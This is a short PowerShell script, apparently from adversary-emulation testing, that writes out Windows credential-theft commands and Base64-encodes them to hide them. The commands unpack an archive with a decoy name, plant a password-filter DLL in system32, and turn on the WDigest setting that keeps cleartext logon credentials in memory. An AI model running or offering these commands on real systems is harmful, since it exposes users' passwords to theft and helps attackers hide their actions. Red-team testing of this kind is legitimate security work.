$Text = "mkdir C:\Tools; Expand-Archive systemperformance.zip -DestinationPath C:\Tools ; Remove-Item systemperformance.zip "
$Text = "copy C:\Tools\AtomicPassFilterx64.dll C:\Windows\system32\"

#$Text = "Start-Service -Name 'Atomic'"
$Text = "reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
